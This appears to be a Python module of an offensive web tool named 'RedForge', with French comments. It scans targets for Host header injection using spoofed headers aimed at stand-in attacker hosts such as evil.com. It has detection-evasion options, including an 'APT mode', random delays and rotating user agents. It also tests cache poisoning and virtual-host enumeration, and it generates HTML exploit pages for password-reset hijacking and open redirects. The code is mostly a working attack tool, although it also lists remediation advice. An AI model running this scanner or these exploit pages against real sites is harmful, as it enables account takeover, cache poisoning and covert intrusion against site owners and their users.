#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Module d'injection Host Header pour RedForge
Détection des vulnérabilités d'injection d'en-tête Host
Version avec support furtif, APT et techniques avancées
"""

import re
import time
import random
import requests
import hashlib
from typing import Dict, Any, List, Optional, Tuple, Set
from dataclasses import dataclass, field
from urllib.parse import urlparse, urljoin
from concurrent.futures import ThreadPoolExecutor, as_completed

@dataclass
class HostHeaderConfig:
    """Configuration avancée pour la détection d'injection Host Header"""
    # Délais
    delay_between_requests: Tuple[float, float] = (0.5, 1.5)
    delay_between_tests: Tuple[float, float] = (1, 3)
    
    # Comportement
    max_test_hosts: int = 20
    test_related_headers: bool = True
    test_sensitive_endpoints: bool = True
    test_cache_poisoning: bool = True
    
    # Furtivité
    stealth_headers: bool = True
    random_user_agents: bool = True
    random_delays: bool = True
    
    # APT
    apt_mode: bool = False
    passive_detection: bool = False
    avoid_detection: bool = True
    
    # Analyse avancée
    detect_vhost_enum: bool = True
    test_password_reset: bool = True
    test_web_cache_poisoning: bool = True
    max_endpoints: int = 20


class HostHeaderInjection:
    """Détection avancée d'injection d'en-tête Host"""
    
    def __init__(self, config: Optional[HostHeaderConfig] = None):
        """
        Initialise le détecteur d'injection Host Header
        
        Args:
            config: Configuration personnalisée
        """
        self.config = config or HostHeaderConfig()
        
        # Hosts de test
        self.test_hosts = self._generate_test_hosts()
        
        # Headers liés à tester
        self.related_headers = [
            'X-Forwarded-Host',
            'X-Host',
            'X-Original-Host',
            'X-Forwarded-Server',
            'X-Proxy-Host',
            'X-Real-IP',
            'X-Forwarded-For',
            'X-Forwarded-Proto',
            'X-Forwarded-Port',
            'X-HTTP-Host-Override',
            'X-Forwarded-Host-Override'
        ]
        
        # Endpoints sensibles
        self.sensitive_endpoints = [
            '/admin', '/reset-password', '/change-password', '/api/user',
            '/login/callback', '/oauth/callback', '/auth/redirect',
            '/password/reset', '/forgot-password', '/email/change',
            '/api/me', '/profile', '/settings', '/webhook', '/callback',
            '/auth/sso', '/saml/acs', '/auth/realms', '/oauth2/token'
        ]
        
        # Indicateurs de succès
        self.success_indicators = [
            'password reset', 'email sent', 'redirect', 'callback', 'oauth',
            'auth', 'verification', 'confirmation', 'reset link',
            'check your email', 'mail sent', 'password changed'
        ]
        
        # Patterns de réflexion
        self.reflection_patterns = [
            r'href=["\'](https?://)?([^"\']+)',
            r'src=["\'](https?://)?([^"\']+)',
            r'action=["\'](https?://)?([^"\']+)',
            r'data-url=["\'](https?://)?([^"\']+)',
            r'<a [^>]*href=["\'](https?://)?([^"\']+)',
            r'<form [^>]*action=["\'](https?://)?([^"\']+)'
        ]
        
        # User agents pour furtivité
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/121.0'
        ]
        
        # Métriques
        self.start_time = None
        self.tests_performed = 0
        self.vulnerabilities_found = 0
        self.rate_limit_hits = 0
    
    def _generate_test_hosts(self) -> List[str]:
        """Génère une liste complète de hosts de test"""
        hosts = [
            "evil.com",
            "attacker.com",
            "localhost",
            "127.0.0.1",
            "example.com.evil.com",
            "evil.com/example.com",
            "evil.com%00example.com",
            "evil.com#example.com",
            "evil.com?example.com",
            "evil.com:8080",
            "evil.com@example.com",
            "evil.com/../",
            "evil.com\\@example.com",
            "evil.com%0aexample.com",
            "evil.com%0dexample.com",
            "evil.com%09example.com",
            "evil.com%20example.com",
            "evil.com%23example.com",
            "evil.com%2fexample.com",
            "evil.com%5cexample.com"
        ]
        
        # Ajouter des variantes avec sous-domaines
        subdomains = ['www', 'mail', 'admin', 'secure', 'api', 'cdn']
        for sub in subdomains:
            hosts.append(f"{sub}.evil.com")
            hosts.append(f"{sub}.evil.com/example.com")
        
        # Limiter selon la configuration
        return hosts[:self.config.max_test_hosts]
    
    def scan(self, target: str, **kwargs) -> Dict[str, Any]:
        """
        Scanne les vulnérabilités d'injection Host Header
        
        Args:
            target: URL cible
            **kwargs: Options de configuration
                - test_endpoints: Endpoints à tester
                - custom_hosts: Hosts personnalisés à tester
                - apt_mode: Mode APT
        """
        self.start_time = time.time()
        self.tests_performed = 0
        self.vulnerabilities_found = 0
        
        # Mettre à jour la configuration
        self._update_config(kwargs)
        
        if not target.startswith(('http://', 'https://')):
            target = 'https://' + target
        
        print(f"  → Test d'injection Host Header sur {target}")
        if self.config.apt_mode:
            print(f"  🕵️ Mode APT activé - Tests discrets")
        
        vulnerabilities = []
        endpoints_to_test = kwargs.get('test_endpoints', self.sensitive_endpoints)
        hosts_to_test = kwargs.get('custom_hosts', self.test_hosts)
        
        # Test de l'en-tête Host principal
        host_vulns = self._test_host_header_advanced(target, 'Host', hosts_to_test)
        vulnerabilities.extend(host_vulns)
        
        # Test des en-têtes liés
        if self.config.test_related_headers:
            for header in self.related_headers:
                header_vulns = self._test_host_header_advanced(target, header, hosts_to_test[:5])
                vulnerabilities.extend(header_vulns)
                if self.config.apt_mode and vulnerabilities:
                    break
        
        # Test des endpoints sensibles
        if self.config.test_sensitive_endpoints:
            endpoint_vulns = self._test_sensitive_endpoints(target, endpoints_to_test, hosts_to_test[:3])
            vulnerabilities.extend(endpoint_vulns)
        
        # Test d'empoisonnement de cache web
        if self.config.test_web_cache_poisoning:
            cache_vulns = self._test_web_cache_poisoning(target)
            vulnerabilities.extend(cache_vulns)
        
        # Énumération de vhosts
        if self.config.detect_vhost_enum:
            vhosts = self._enumerate_virtual_hosts(target)
            if vhosts:
                print(f"      ✓ Vhosts détectés: {', '.join(vhosts[:3])}")
        
        return self._generate_results(target, vulnerabilities)
    
    def _update_config(self, kwargs: Dict):
        """Met à jour la configuration avec les kwargs"""
        if 'max_test_hosts' in kwargs:
            self.config.max_test_hosts = kwargs['max_test_hosts']
        if 'test_endpoints' in kwargs:
            self.config.max_endpoints = len(kwargs['test_endpoints'])
        
        # Mode APT
        if kwargs.get('apt_mode', False) or kwargs.get('stealth_level') == 'apt':
            self.config.apt_mode = True
            self.config.passive_detection = True
            self.config.avoid_detection = True
            self.config.stealth_headers = True
            self.config.random_delays = True
            self.config.max_test_hosts = min(self.config.max_test_hosts, 10)
            self.config.max_endpoints = min(self.config.max_endpoints, 10)
            self.config.delay_between_tests = (5, 15)
    
    def _get_stealth_headers(self, additional_headers: Optional[Dict] = None) -> Dict[str, str]:
        """Génère des headers furtifs"""
        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive'
        }
        
        if self.config.random_user_agents:
            headers['User-Agent'] = random.choice(self.user_agents)
        
        if self.config.stealth_headers:
            headers['Cache-Control'] = 'no-cache'
            headers['Pragma'] = 'no-cache'
        
        if additional_headers:
            headers.update(additional_headers)
        
        return headers
    
    def _test_host_header_advanced(self, target: str, header: str, 
                                    hosts: List[str]) -> List[Dict[str, Any]]:
        """
        Teste l'injection dans un en-tête spécifique avec analyse avancée
        
        Args:
            target: URL cible
            header: Nom de l'en-tête
            hosts: Liste des valeurs à tester
        """
        vulnerabilities = []
        
        for idx, host_value in enumerate(hosts):
            # Pause APT
            if self.config.apt_mode and idx > 0:
                self._apt_pause()
            elif self.config.random_delays and idx > 0:
                time.sleep(random.uniform(*self.config.delay_between_tests))
            
            try:
                headers = self._get_stealth_headers({header: host_value})
                response = requests.get(target, headers=headers, timeout=10, verify=False, allow_redirects=False)
                self.tests_performed += 1
                
                vuln = self._analyze_response(response, target, header, host_value)
                
                if vuln['vulnerable']:
                    self.vulnerabilities_found += 1
                    vulnerabilities.append(vuln)
                    print(f"      ✓ Host Header injection: {header}: {host_value}")
                    
                    if self.config.apt_mode:
                        break  # Un suffit en mode APT
                        
            except requests.exceptions.Timeout:
                pass
            except Exception as e:
                if not self.config.passive_detection:
                    pass
        
        return vulnerabilities
    
    def _analyze_response(self, response: requests.Response, target: str,
                          header: str, host_value: str) -> Dict[str, Any]:
        """
        Analyse la réponse pour détecter les vulnérabilités
        
        Args:
            response: Réponse HTTP
            target: URL cible
            header: En-tête testé
            host_value: Valeur injectée
        """
        result = {
            "vulnerable": False,
            "header": header,
            "value": host_value,
            "severity": "HIGH",
            "details": [],
            "risk_score": 0,
            "endpoint": None
        }
        
        # Vérifier la réflexion dans le contenu
        if host_value in response.text:
            result["vulnerable"] = True
            result["details"].append("Host réfléchi dans la réponse")
            result["risk_score"] = max(result["risk_score"], 75)
        
        # Vérifier les redirections
        location = response.headers.get('Location', '')
        if location and host_value in location:
            result["vulnerable"] = True
            result["details"].append(f"Redirection vers {host_value}")
            result["risk_score"] = max(result["risk_score"], 85)
        
        # Vérifier les liens générés
        for pattern in self.reflection_patterns:
            matches = re.findall(pattern, response.text, re.IGNORECASE)
            for match in matches:
                if host_value in str(match):
                    result["vulnerable"] = True
                    result["details"].append(f"Liens générés avec le host injecté: {match[1][:50]}")
                    result["risk_score"] = max(result["risk_score"], 80)
                    break
        
        # Vérifier les headers de réponse
        for resp_header, value in response.headers.items():
            if host_value in value:
                result["vulnerable"] = True
                result["details"].append(f"Header {resp_header} contient le host injecté")
                result["risk_score"] = max(result["risk_score"], 70)
        
        # Déterminer la sévérité
        if result["risk_score"] >= 85:
            result["severity"] = "CRITICAL"
        elif result["risk_score"] >= 70:
            result["severity"] = "HIGH"
        
        return result
    
    def _test_sensitive_endpoints(self, base_url: str, endpoints: List[str],
                                   hosts: List[str]) -> List[Dict[str, Any]]:
        """
        Teste les endpoints sensibles pour l'injection Host Header
        
        Args:
            base_url: URL de base
            endpoints: Liste des endpoints à tester
            hosts: Liste des hosts à tester
        """
        vulnerabilities = []
        
        for endpoint in endpoints[:self.config.max_endpoints]:
            test_url = urljoin(base_url, endpoint)
            
            for host_value in hosts:
                if self.config.random_delays:
                    time.sleep(random.uniform(0.5, 1.5))
                
                try:
                    headers = self._get_stealth_headers({'Host': host_value})
                    response = requests.get(test_url, headers=headers, timeout=10, verify=False)
                    self.tests_performed += 1
                    
                    # Vérifier les indicateurs de succès
                    for indicator in self.success_indicators:
                        if indicator in response.text.lower():
                            vulnerabilities.append({
                                "vulnerable": True,
                                "header": "Host",
                                "value": host_value,
                                "severity": "CRITICAL",
                                "details": [f"Endpoint sensible vulnérable: {indicator}"],
                                "endpoint": endpoint,
                                "risk_score": 95
                            })
                            print(f"      ✓ Host Header injection sur endpoint sensible: {endpoint}")
                            break
                    
                    # Vérifier les changements de comportement
                    normal_headers = self._get_stealth_headers()
                    normal_response = requests.get(test_url, headers=normal_headers, timeout=10, verify=False)
                    
                    if len(response.text) != len(normal_response.text):
                        vulnerabilities.append({
                            "vulnerable": True,
                            "header": "Host",
                            "value": host_value,
                            "severity": "HIGH",
                            "details": ["Différence de réponse détectée"],
                            "endpoint": endpoint,
                            "risk_score": 80
                        })
                        print(f"      ✓ Différence de réponse sur {endpoint}")
                        break
                        
                except Exception:
                    pass
            
            if self.config.apt_mode and vulnerabilities:
                break
        
        return vulnerabilities
    
    def _test_web_cache_poisoning(self, target: str) -> List[Dict[str, Any]]:
        """
        Teste l'empoisonnement de cache web via Host Header
        
        Args:
            target: URL cible
        """
        vulnerabilities = []
        
        # Générer une URL unique
        cache_buster = hashlib.md5(f"{time.time()}{random.random()}".encode()).hexdigest()[:8]
        test_url = f"{target}?_cb={cache_buster}"
        
        test_hosts = ["evil.com", "attacker.com"]
        
        for host_value in test_hosts:
            try:
                # Requête malveillante
                headers = self._get_stealth_headers({'Host': host_value})
                malicious_response = requests.get(test_url, headers=headers, timeout=10, verify=False)
                malicious_hash = hashlib.md5(malicious_response.text.encode()).hexdigest()
                
                # Attendre la propagation
                time.sleep(2)
                
                # Requête normale
                normal_headers = self._get_stealth_headers()
                normal_response = requests.get(test_url, headers=normal_headers, timeout=10, verify=False)
                normal_hash = hashlib.md5(normal_response.text.encode()).hexdigest()
                
                if malicious_hash == normal_hash and len(malicious_response.text) > 100:
                    vulnerabilities.append({
                        "vulnerable": True,
                        "header": "Host",
                        "value": host_value,
                        "severity": "CRITICAL",
                        "details": ["Cache web empoisonné via Host Header"],
                        "risk_score": 95
                    })
                    print(f"      ✓ Cache poisoning via Host Header: {host_value}")
                    
            except Exception:
                pass
        
        return vulnerabilities
    
    def _enumerate_virtual_hosts(self, target: str) -> List[str]:
        """
        Énumère les hôtes virtuels via Host Header
        
        Args:
            target: URL cible
        """
        discovered_hosts = []
        
        common_vhosts = [
            'www', 'mail', 'webmail', 'admin', 'secure', 'vpn',
            'remote', 'dev', 'test', 'staging', 'stage', 'beta',
            'api', 'app', 'dashboard', 'portal', 'cpanel', 'webmin'
        ]
        
        parsed = urlparse(target)
        base_domain = parsed.netloc.split(':')[0]
        
        # Extraire le domaine principal
        domain_parts = base_domain.split('.')
        if len(domain_parts) > 2:
            main_domain = '.'.join(domain_parts[-2:])
        else:
            main_domain = base_domain
        
        for vhost in common_vhosts:
            test_host = f"{vhost}.{main_domain}"
            
            try:
                headers = self._get_stealth_headers({'Host': test_host})
                response = requests.get(target, headers=headers, timeout=10, verify=False)
                
                # Vérifier si la réponse est différente
                if response.status_code == 200 and len(response.text) > 500:
                    discovered_hosts.append(test_host)
                    
            except Exception:
                pass
        
        return discovered_hosts
    
    def _apt_pause(self):
        """Pause APT pour simuler un comportement humain"""
        if random.random() < 0.3:
            pause_duration = random.uniform(30, 120)
            print(f"      💤 Pause APT: {pause_duration:.0f}s")
            time.sleep(pause_duration)
    
    def _generate_results(self, target: str, vulnerabilities: List[Dict]) -> Dict[str, Any]:
        """Génère les résultats de l'attaque"""
        duration = time.time() - self.start_time
        
        return {
            "target": target,
            "vulnerabilities": vulnerabilities,
            "count": len(vulnerabilities),
            "tests_performed": self.tests_performed,
            "scan_duration": duration,
            "tests_per_second": self.tests_performed / duration if duration > 0 else 0,
            "config": {
                "apt_mode": self.config.apt_mode,
                "test_related_headers": self.config.test_related_headers,
                "test_sensitive_endpoints": self.config.test_sensitive_endpoints
            },
            "summary": self._generate_summary(vulnerabilities),
            "recommendations": self._generate_recommendations(vulnerabilities)
        }
    
    def _generate_summary(self, vulnerabilities: List[Dict]) -> Dict[str, Any]:
        """Génère un résumé des vulnérabilités"""
        if not vulnerabilities:
            return {"total": 0, "severity": "INFO", "message": "Aucune injection Host Header détectée"}
        
        by_header = {}
        for v in vulnerabilities:
            header = v.get('header', 'Unknown')
            by_header[header] = by_header.get(header, 0) + 1
        
        return {
            "total": len(vulnerabilities),
            "by_header": by_header,
            "critical": len([v for v in vulnerabilities if v.get('severity') == 'CRITICAL']),
            "high": len([v for v in vulnerabilities if v.get('severity') == 'HIGH']),
            "max_risk_score": max([v.get('risk_score', 0) for v in vulnerabilities]) if vulnerabilities else 0
        }
    
    def _generate_recommendations(self, vulnerabilities: List[Dict]) -> List[str]:
        """Génère des recommandations basées sur les vulnérabilités trouvées"""
        recommendations = set()
        
        if vulnerabilities:
            recommendations.add("Ne pas utiliser la valeur de l'en-tête Host pour générer des URLs")
            recommendations.add("Valider l'en-tête Host contre une liste blanche de domaines autorisés")
            recommendations.add("Utiliser SERVER_NAME au lieu de HTTP_HOST quand possible")
        
        if any(v.get('header') != 'Host' for v in vulnerabilities):
            recommendations.add("Désactiver ou valider strictement les headers X-Forwarded-*")
        
        if any(v.get('endpoint') for v in vulnerabilities):
            recommendations.add("Implémenter une validation CSRF pour les actions sensibles")
            recommendations.add("Utiliser des tokens de vérification dans les emails de reset")
        
        if any(v.get('severity') == 'CRITICAL' for v in vulnerabilities):
            recommendations.add("URGENT: Corriger les injections Host Header sur les endpoints critiques")
        
        recommendations.add("Configurer le serveur pour ignorer les headers Host malformés")
        
        return list(recommendations)
    
    def generate_password_reset_exploit(self, target: str, 
                                        reset_endpoint: str,
                                        victim_email: str = "victim@example.com",
                                        attacker_host: str = "evil.com") -> str:
        """
        Génère un exploit pour le reset de mot de passe via Host Header injection
        
        Args:
            target: URL cible
            reset_endpoint: Endpoint de reset de mot de passe
            victim_email: Email de la victime
            attacker_host: Host de l'attaquant
        """
        exploit_template = f'''<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>Password Reset Exploit - RedForge</title>
    <style>
        body {{
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 0;
            padding: 20px;
        }}
        .container {{
            background: white;
            border-radius: 10px;
            box-shadow: 0 25px 50px -12px rgba(0,0,0,0.25);
            padding: 30px;
            max-width: 500px;
            width: 100%;
        }}
        h1 {{ color: #2d3748; margin-bottom: 10px; }}
        .warning {{
            background: #fed7d7;
            color: #c53030;
            padding: 10px;
            border-radius: 5px;
            margin: 20px 0;
            font-size: 14px;
        }}
        .info {{
            background: #e2e8f0;
            padding: 10px;
            border-radius: 5px;
            font-size: 12px;
            color: #4a5568;
            margin-top: 20px;
        }}
        button {{
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            width: 100%;
            margin-top: 20px;
        }}
        input {{
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #cbd5e0;
            border-radius: 5px;
            font-size: 14px;
        }}
        label {{ font-weight: 600; color: #2d3748; }}
    </style>
</head>
<body>
    <div class="container">
        <h1>🎯 Password Reset Exploit</h1>
        <p>Host Header Injection - RedForge</p>
        
        <div class="warning">
            ⚠️ Cet exploit tente d'exploiter une injection Host Header pour détourner le reset de mot de passe.
        </div>
        
        <form id="resetForm" method="POST" action="{reset_endpoint}">
            <label>Email de la victime:</label>
            <input type="email" name="email" value="{victim_email}" readonly>
            <input type="hidden" name="Host" value="{attacker_host}">
        </form>
        
        <button onclick="sendExploit()">🎯 Déclencher l'exploit</button>
        
        <div class="info">
            <strong>📋 Informations</strong><br>
            Cible: {target}<br>
            Endpoint: {reset_endpoint}<br>
            Email victime: {victim_email}<br>
            Host attaquant: {attacker_host}<br>
            Le lien de reset sera envoyé avec l'URL pointant vers {attacker_host}
        </div>
    </div>
    
    <script>
        function sendExploit() {{
            // Méthode 1: Formulaire avec Host Header
            const form = document.getElementById('resetForm');
            
            // Méthode 2: Fetch avec Host Header personnalisé
            fetch('{reset_endpoint}', {{
                method: 'POST',
                headers: {{
                    'Host': '{attacker_host}',
                    'Content-Type': 'application/x-www-form-urlencoded'
                }},
                body: 'email={victim_email}',
                mode: 'cors',
                credentials: 'include'
            }}).then(response => {{
                console.log('Exploit envoyé!');
                alert('Exploit envoyé! Le lien de reset devrait être intercepté.');
            }}).catch(error => {{
                console.error('Erreur:', error);
                alert('Erreur lors de l\'envoi de l\'exploit');
            }});
            
            // Méthode 3: XMLHttpRequest
            const xhr = new XMLHttpRequest();
            xhr.open('POST', '{reset_endpoint}', true);
            xhr.setRequestHeader('Host', '{attacker_host}');
            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
            xhr.send('email={victim_email}');
            
            // Soumettre le formulaire également
            form.submit();
        }}
        
        console.log('Exploit Host Header Injection chargé');
    </script>
</body>
</html>'''
        
        return exploit_template
    
    def generate_redirect_exploit(self, target: str, redirect_param: str,
                                   attacker_domain: str = "evil.com") -> str:
        """
        Génère un exploit de redirection malveillante via Host Header
        
        Args:
            target: URL cible
            redirect_param: Paramètre de redirection
            attacker_domain: Domaine de l'attaquant
        """
        exploit_url = f"{target}?{redirect_param}=https://{attacker_domain}/login"
        
        exploit_html = f'''<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>Open Redirect Exploit - RedForge</title>
    <meta http-equiv="refresh" content="0; url={exploit_url}">
    <style>
        body {{
            font-family: monospace;
            background: #1a202c;
            color: #68d391;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }}
        .container {{ text-align: center; }}
        a {{ color: #68d391; }}
    </style>
</head>
<body>
    <div class="container">
        <h1>🎯 Open Redirect Exploit</h1>
        <p>Redirection vers <a href="{exploit_url}">{exploit_url}</a></p>
        <script>
            window.location.href = '{exploit_url}';
        </script>
    </div>
</body>
</html>'''
        
        return exploit_html
    
    def get_statistics(self) -> Dict[str, Any]:
        """Retourne les statistiques de détection"""
        return {
            "tests_performed": self.tests_performed,
            "vulnerabilities_found": self.vulnerabilities_found,
            "success_rate": (self.vulnerabilities_found / max(1, self.tests_performed) * 100),
            "scan_duration": time.time() - self.start_time if self.start_time else 0,
            "rate_limit_hits": self.rate_limit_hits
        }


# Point d'entrée pour tests
if __name__ == "__main__":
    # Test mode normal
    print("=== Test mode normal ===")
    hhi = HostHeaderInjection()
    results = hhi.scan("https://example.com")
    print(f"Injections Host Header: {results['count']}")
    
    # Test mode APT
    print("\n=== Test mode APT ===")
    apt_config = HostHeaderConfig(apt_mode=True, max_test_hosts=10)
    hhi_apt = HostHeaderInjection(config=apt_config)
    results_apt = hhi_apt.scan("https://example.com", apt_mode=True)
    print(f"Injections Host Header (APT): {results_apt['count']}")
    
    # Générer exploit si vulnérable
    if results_apt['vulnerabilities']:
        exploit = hhi_apt.generate_password_reset_exploit(
            "https://target.com",
            "/reset-password",
            "victim@example.com",
            "evil.com"
        )
        with open("host_header_exploit.html", "w") as f:
            f.write(exploit)
        print("Exploit généré: host_header_exploit.html")
    
    # Afficher les recommandations
    for rec in results_apt['recommendations']:
        print(f"Recommandation: {rec}")